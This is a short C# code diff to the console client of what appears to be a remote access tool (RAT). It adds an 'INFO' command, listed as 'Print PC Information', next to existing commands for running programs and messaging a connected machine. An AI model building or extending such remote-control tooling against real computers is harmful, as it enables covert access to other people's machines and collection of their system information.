@@ -43,6 +43,9 @@ namespace RATClient
                     case "run":
                         SendCommand(CMDS);
                         break;
+                    case "info":
+                        SendCommand(CMDS);
+                        break;
                     case "help":
                         Help();
                         break;
@@ -111,6 +114,7 @@ namespace RATClient
             Console.WriteLine("MESSAGE        Send A Message To The Server");
             Console.WriteLine("DISCONNECT     End A Connection");
             Console.WriteLine("EXIT           Quit The Program");
+            Console.WriteLine("INFO           Print PC Information");
             Console.WriteLine("RUN            Run A Program");
             Console.WriteLine("HELP           List Commands");
         }
